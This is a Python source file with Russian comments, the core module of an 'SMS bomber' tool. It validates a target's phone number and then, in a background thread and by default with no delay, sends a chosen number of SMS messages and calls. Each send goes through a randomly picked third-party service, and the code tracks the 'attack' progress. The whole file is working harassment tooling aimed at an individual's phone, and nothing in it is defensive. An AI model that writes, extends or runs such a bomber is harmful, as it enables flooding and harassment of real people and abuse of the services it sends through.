#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Модуль бомбера BBοomer
Реализует функции отправки SMS/звонков без авто перехода на сайт
"""

import time
import threading
import random
from datetime import datetime
import phonenumbers
from services.service_manager import ServiceManager


class Bomber:
    """Класс бомбера"""
    
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.is_attacking = False
        self.attack_thread = None
        self.sent_count = 0
        self.failed_count = 0
        self.start_time = None
        self.target_phone = ""
        self.total_messages = 0
        
        # Инициализация менеджера сервисов
        self.service_manager = ServiceManager(config)
    
    def validate_phone_number(self, phone_number):
        """Проверка валидности номера телефона"""
        try:
            parsed = phonenumbers.parse(phone_number, "RU")
            return phonenumbers.is_valid_number(parsed)
        except:
            return False
    
    def send_message(self, phone_number):
        """Отправка сообщения через случайный сервис"""
        try:
            # Выбираем случайный сервис для отправки
            service = self.service_manager.get_random_service()
            if not service:
                self.logger.log("Ошибка: Нет доступных сервисов для отправки", "error")
                return False
            
            # Отправляем сообщение через сервис
            result = service.send_message(phone_number)
            
            if result:
                self.sent_count += 1
                self.logger.log(f"Сообщение успешно отправлено через {service.name}", "success")
                return True
            else:
                self.failed_count += 1
                self.logger.log(f"Ошибка отправки сообщения через {service.name}", "error")
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.logger.log(f"Исключение при отправке сообщения: {e}", "error")
            return False
    
    def make_call(self, phone_number):
        """Осуществление звонка через случайный сервис"""
        try:
            # Выбираем случайный сервис для звонка
            service = self.service_manager.get_random_service()
            if not service:
                self.logger.log("Ошибка: Нет доступных сервисов для звонка", "error")
                return False
            
            # Осуществляем звонок через сервис
            result = service.make_call(phone_number)
            
            if result:
                self.sent_count += 1
                self.logger.log(f"Звонок успешно осуществлен через {service.name}", "success")
                return True
            else:
                self.failed_count += 1
                self.logger.log(f"Ошибка осуществления звонка через {service.name}", "error")
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.logger.log(f"Исключение при осуществлении звонка: {e}", "error")
            return False
    
    def attack_cycle(self, phone_number, message_count):
        """Цикл атаки"""
        print(f"Атака начата на {phone_number} с отправкой {message_count} сообщений...")
        self.start_time = datetime.now()
        
        for i in range(message_count):
            if not self.is_attacking:
                break
            
            # Отправляем сообщение или звонок
            if random.choice([True, False]):
                self.send_message(phone_number)
            else:
                self.make_call(phone_number)
            
            # Отображаем прогресс
            progress = (i + 1) / message_count * 100
            print(f"Прогресс: {progress:.1f}% ({i + 1}/{message_count})")
            
            # Без КД между отправками (если не установлено в конфигурации)
            if self.config.cooldown > 0:
                time.sleep(self.config.cooldown)
        
        self.is_attacking = False
        elapsed_time = (datetime.now() - self.start_time).total_seconds()
        print(f"Атака завершена за {elapsed_time:.2f} секунд")
        print(f"Отправлено: {self.sent_count}, Ошибок: {self.failed_count}")
        self.logger.log(f"Атака завершена. Отправлено: {self.sent_count}, Ошибок: {self.failed_count}", "info")
    
    def start_attack(self, phone_number, message_count):
        """Запуск атаки"""
        if self.is_attacking:
            print("Атака уже запущена!")
            return
        
        if not self.validate_phone_number(phone_number):
            print("Невалидный номер телефона!")
            return
        
        self.is_attacking = True
        self.sent_count = 0
        self.failed_count = 0
        self.target_phone = phone_number
        self.total_messages = message_count
        
        self.attack_thread = threading.Thread(
            target=self.attack_cycle, 
            args=(phone_number, message_count)
        )
        self.attack_thread.start()
        print("Атака запущена в отдельном потоке.")
        self.logger.log(f"Атака запущена на {phone_number} с {message_count} сообщениями", "info")
    
    def stop_attack(self):
        """Остановка атаки"""
        if not self.is_attacking:
            print("Атака не запущена!")
            return
        
        self.is_attacking = False
        if self.attack_thread:
            self.attack_thread.join()
        print("Атака остановлена.")
        self.logger.log("Атака остановлена", "info")
    
    def get_status(self):
        """Получение статуса атаки"""
        if not self.is_attacking:
            return "Не активна"
        
        if self.total_messages > 0:
            progress = self.sent_count / self.total_messages * 100
            return f"Активна: {progress:.1f}% ({self.sent_count}/{self.total_messages})"
        else:
            return f"Активна: {self.sent_count} сообщений отправлено"